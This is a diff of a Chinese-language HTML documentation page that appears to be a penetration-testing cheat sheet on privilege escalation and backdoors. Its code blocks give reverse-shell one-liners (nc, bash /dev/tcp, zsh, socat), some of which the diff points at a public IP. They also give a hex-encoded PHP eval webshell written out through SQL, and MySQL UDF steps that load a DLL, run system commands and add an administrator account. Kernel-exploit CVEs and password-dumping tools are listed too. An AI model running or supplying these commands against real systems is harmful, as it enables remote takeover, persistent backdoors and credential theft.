@@ -508,14 +508,14 @@
       
         <li class="md-nav__item">
   <a href="#shell" class="md-nav__link">
-    反弹shell
+    反弹 shell
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#mssql" class="md-nav__link">
-    mssql提权
+    mssql 提权
   </a>
   
 </li>
@@ -529,7 +529,7 @@
       
         <li class="md-nav__item">
   <a href="#udf" class="md-nav__link">
-    UDF提权
+    UDF 提权
   </a>
   
 </li>
@@ -543,14 +543,14 @@
       
         <li class="md-nav__item">
   <a href="#mysql_1" class="md-nav__link">
-    查看MYsql安装根目录
+    查看 MYsql 安装根目录
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#libplugin" class="md-nav__link">
-    创建/lib/plugin目录
+    创建/lib/plugin 目录
   </a>
   
     <nav class="md-nav">
@@ -2630,14 +2630,14 @@
       
         <li class="md-nav__item">
   <a href="#shell" class="md-nav__link">
-    反弹shell
+    反弹 shell
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#mssql" class="md-nav__link">
-    mssql提权
+    mssql 提权
   </a>
   
 </li>
@@ -2651,7 +2651,7 @@
       
         <li class="md-nav__item">
   <a href="#udf" class="md-nav__link">
-    UDF提权
+    UDF 提权
   </a>
   
 </li>
@@ -2665,14 +2665,14 @@
       
         <li class="md-nav__item">
   <a href="#mysql_1" class="md-nav__link">
-    查看MYsql安装根目录
+    查看 MYsql 安装根目录
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#libplugin" class="md-nav__link">
-    创建/lib/plugin目录
+    创建/lib/plugin 目录
   </a>
   
     <nav class="md-nav">
@@ -2745,23 +2745,24 @@
                 
                   <h1>提权和后门</h1>
                 
-                <h2 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
-<p>后门：<a href="https://github.com/LukaSikic/HaCoder.py">https://github.com/LukaSikic/HaCoder.py</a><br />
-<div class="codehilite"><pre><span></span>nc -e /bin/bash <span class="m">192</span>.168.1.2 <span class="m">8080</span>
-bash -c <span class="s1">&#39;bash -i &gt;/dev/tcp/192.168.1.2/8080 0&gt;&amp;1&#39;</span>
+                <h2 id="shell">反弹 shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
+<p>后门：<a href="https://github.com/LukaSikic/HaCoder.py">https://github.com/LukaSikic/HaCoder.py</a></p>
+<div class="codehilite"><pre><span></span>nc -e /bin/bash <span class="m">4</span>.4.9.102 <span class="m">8080</span>
+bash -c <span class="s1">&#39;bash -i &gt;/dev/tcp/4.4.9.102/8080 0&gt;&amp;1&#39;</span>
 zsh -c <span class="s1">&#39;zmodload zsh/net/tcp &amp;&amp; ztcp 192.168.1.2 8080 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#39;</span>
-socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  
-</pre></div></p>
-<h2 id="mssql">mssql提权<a class="headerlink" href="#mssql" title="Permanent link">&para;</a></h2>
+socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  <span class="c1">#4.4.9.102</span>
+</pre></div>
+
+<h2 id="mssql">mssql 提权<a class="headerlink" href="#mssql" title="Permanent link">&para;</a></h2>
 <p>TODO</p>
 <h2 id="mysql">mysql 提权<a class="headerlink" href="#mysql" title="Permanent link">&para;</a></h2>
-<h2 id="udf">UDF提权<a class="headerlink" href="#udf" title="Permanent link">&para;</a></h2>
-<p>虽然MySQL的内置函数虽然丰富，但毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对 MySQL 进行一些扩展，这就是可以自行添加的MySQL 的 UDF。</p>
-<p>MYSQL5.1及之后的几个版本又多了一个限制：创建函数时所用的DLL只能放在mysql的plugin目录里面，而且这个plugin目录默认是不存在的，可能就是为了防止黑客通过导出文件的方式将DLL来写到这个文件夹，如果导出文件（<code>into dumpfile</code>）的目标目录不存在是会报错的。</p>
-<p><strong>所以在导出UDF提权之前 ，先确定一下MYSQL的版本是有必要的</strong>(<code>select version();</code>)</p>
+<h2 id="udf">UDF 提权<a class="headerlink" href="#udf" title="Permanent link">&para;</a></h2>
+<p>虽然 MySQL 的内置函数虽然丰富，但毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对 MySQL 进行一些扩展，这就是可以自行添加的 MySQL 的 UDF。</p>
+<p>MYSQL5.1 及之后的几个版本又多了一个限制：创建函数时所用的 DLL 只能放在 mysql 的 plugin 目录里面，而且这个 plugin 目录默认是不存在的，可能就是为了防止黑客通过导出文件的方式将 DLL 来写到这个文件夹，如果导出文件（<code>into dumpfile</code>）的目标目录不存在是会报错的。</p>
+<p><strong>所以在导出 UDF 提权之前 ，先确定一下 MYSQL 的版本是有必要的</strong>(<code>select version();</code>)</p>
 <h2 id="_1">写入一句话木马<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span><span class="k">union</span> <span class="k">select</span> 
-<span class="mi">0</span><span class="n">x3c3f70687020406576616c28245f504f53545b2770617373275d293b3f3e</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">into</span> 
+<div class="codehilite"><pre><span></span><span class="k">union</span> <span class="k">select</span>
+<span class="mi">0</span><span class="n">x3c3f70687020406576616c28245f504f53545b2770617373275d293b3f3e</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">into</span>
 <span class="n">dumpfile</span> <span class="s1">&#39;c:/www/small.php&#39;</span>
 
 <span class="o">#</span> <span class="err">以上语句连续执行两次，如果出现以下错误，即说明文件写入成功：</span>
@@ -2769,26 +2770,28 @@ socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,s
 <span class="o">#</span> <span class="err">第二次写入提示文件已存在则说明文件写入成功</span>
 </pre></div>
 
-<h2 id="mysql_1">查看MYsql安装根目录<a class="headerlink" href="#mysql_1" title="Permanent link">&para;</a></h2>
-<p><div class="codehilite"><pre><span></span><span class="k">select</span> <span class="o">@@</span><span class="n">basedir</span><span class="p">;</span>
+<h2 id="mysql_1">查看 MYsql 安装根目录<a class="headerlink" href="#mysql_1" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="o">@@</span><span class="n">basedir</span><span class="p">;</span>
 </pre></div>
-根据 我们前面讲述的MySQL5.1版本及其之后版本，我们自定义函数需要用到的shell导出的目录应该是： 
+
+<p>根据 我们前面讲述的 MySQL5.1 版本及其之后版本，我们自定义函数需要用到的 shell 导出的目录应该是：
 <code>C:/Program Files/phpStudy/MySQL/lib/plugin/</code></p>
 <p>其实也可以通过以下语句获得插件目录(<em>并不一定真实存在</em>):
 <code>show variables like '%plugin%';</code></p>
-<h2 id="libplugin">创建/lib/plugin目录<a class="headerlink" href="#libplugin" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="s1">&#39;test&#39;</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;C:/Program Files/phpStudy/MySQL/lib::INDEX_ALLOCATION&#39;</span><span class="p">;</span>   
+<h2 id="libplugin">创建/lib/plugin 目录<a class="headerlink" href="#libplugin" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="s1">&#39;test&#39;</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;C:/Program Files/phpStudy/MySQL/lib::INDEX_ALLOCATION&#39;</span><span class="p">;</span>
 <span class="o">#</span> <span class="err">利用</span><span class="n">NTFS</span> <span class="n">ADS创建lib目录</span>
 
 <span class="k">select</span> <span class="s1">&#39;test&#39;</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;C:/Program Files/phpStudy/MySQL/lib/plugin::INDEX_ALLOCATION&#39;</span><span class="p">;</span>
 <span class="o">#</span> <span class="err">利用</span><span class="n">NTFS</span> <span class="n">ADS创建plugin目录</span>
 </pre></div>
 
-<p><strong>利用NTFS ADS创建目录成功率很小，这个命令执行返回一直为空，二次执行不提示目录已存在，即可判断目录创建失败。如上图即目录创建失败。</strong></p>
-<p>将udf.dll 导出到plugin目录
+<p><strong>利用 NTFS ADS 创建目录成功率很小，这个命令执行返回一直为空，二次执行不提示目录已存在，即可判断目录创建失败。如上图即目录创建失败。</strong></p>
+<p>将 udf.dll 导出到 plugin 目录</p>
 <div class="codehilite"><pre><span></span><span class="k">select</span> <span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;C:/www/udf.dll&#39;</span><span class="p">)</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">&#39;C:/Program Files/phpStudy/MySQL/lib/plugin/udf.dll&#39;</span><span class="p">;</span>
-</pre></div></p>
-<p>通过sql语句通过udf.dll 创建shell函数</p>
+</pre></div>
+
+<p>通过 sql 语句通过 udf.dll 创建 shell 函数</p>
 <div class="codehilite"><pre><span></span><span class="k">create</span> <span class="k">function</span> <span class="n">shell</span> <span class="k">returns</span> <span class="n">string</span> <span class="n">soname</span> <span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span>
 <span class="o">#</span> <span class="err">假设此时</span><span class="n">udf</span><span class="p">.</span><span class="n">dll被上传到了c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32目录</span>
 
@@ -2800,33 +2803,35 @@ socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,s
 </pre></div>
 
 <h3 id="_2">用法<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
-<p><code>shell</code>函数用于执行系统命令，用法如下
-<div class="codehilite"><pre><span></span><span class="o">#</span> <span class="err">我们尝试在服务器添加一个用户名为</span><span class="o">`</span><span class="n">matrix</span><span class="o">`</span><span class="err">密码为</span><span class="o">`</span><span class="n">matrix</span><span class="o">`</span><span class="err">的账户</span><span class="p">:</span>  
+<p><code>shell</code>函数用于执行系统命令，用法如下</p>
+<div class="codehilite"><pre><span></span><span class="o">#</span> <span class="err">我们尝试在服务器添加一个用户名为</span><span class="o">`</span><span class="n">matrix</span><span class="o">`</span><span class="err">密码为</span><span class="o">`</span><span class="n">matrix</span><span class="o">`</span><span class="err">的账户</span><span class="p">:</span>
 
 <span class="k">select</span> <span class="n">shell</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="s1">&#39;net user matrix matrix /add&#39;</span><span class="p">);</span>
 
-<span class="o">#</span> <span class="err">接着尝试把</span><span class="o">`</span><span class="n">matrix</span><span class="o">`</span><span class="err">账户添加到</span><span class="o">`</span><span class="n">administrators</span><span class="o">`</span><span class="err">管理组：</span>  
-<span class="k">select</span> <span class="n">shell</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="s1">&#39;net localgroup administrators matrix /add&#39;</span><span class="p">);</span>  
-<span class="o">#</span> <span class="err">然后查看详细的账户信息，确认是否已经成功添加上账户和账户是否已经被成功添加到管理员组。如下操作：</span>  
+<span class="o">#</span> <span class="err">接着尝试把</span><span class="o">`</span><span class="n">matrix</span><span class="o">`</span><span class="err">账户添加到</span><span class="o">`</span><span class="n">administrators</span><span class="o">`</span><span class="err">管理组：</span>
+<span class="k">select</span> <span class="n">shell</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="s1">&#39;net localgroup administrators matrix /add&#39;</span><span class="p">);</span>
+<span class="o">#</span> <span class="err">然后查看详细的账户信息，确认是否已经成功添加上账户和账户是否已经被成功添加到管理员组。如下操作：</span>
 <span class="k">select</span> <span class="n">shell</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="s1">&#39;net user matrix&#39;</span><span class="p">);</span>
-</pre></div></p>
+</pre></div>
+
 <hr />
-<p>提权完毕之后我们可以通过以下语句删除相关函数以防被他人利用：
+<p>提权完毕之后我们可以通过以下语句删除相关函数以防被他人利用：</p>
 <div class="codehilite"><pre><span></span><span class="k">drop</span> <span class="k">function</span> <span class="n">shell</span><span class="p">;</span>
 <span class="o">#</span> <span class="err">删除函数</span>
 <span class="k">delete</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">func</span> <span class="k">where</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;shell&#39;</span><span class="p">;</span>
 <span class="o">#</span> <span class="err">删除函数</span>
-</pre></div></p>
+</pre></div>
+
 <h2 id="linux">linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h2>
 <ul>
 <li>CVE-2016-5195 脏牛漏洞</li>
-<li>CVE-2016-8655：Linux内核竞争条件漏洞</li>
-<li>CVE-2017-1000367 sudo本地提权漏洞:selinux必须开</li>
+<li>CVE-2016-8655：Linux 内核竞争条件漏洞</li>
+<li>CVE-2017-1000367 sudo 本地提权漏洞:selinux 必须开</li>
 </ul>
 <h2 id="win">win<a class="headerlink" href="#win" title="Permanent link">&para;</a></h2>
 <h2 id="_3">系统密码破解<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
 <ol>
-<li>getpass.exe </li>
+<li>getpass.exe</li>
 <li>minikz</li>
 </ol>
 <h2 id="_4">补丁对应漏洞<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
@@ -2844,7 +2849,7 @@ KB2620712→ MS11-097
 KB2393802→ MS11-011
 kb942831 →MS08-005
 KB2503665 →MS11-046
-KB2592799→ MS11-080  
+KB2592799→ MS11-080
 </pre></div>
                 
                   
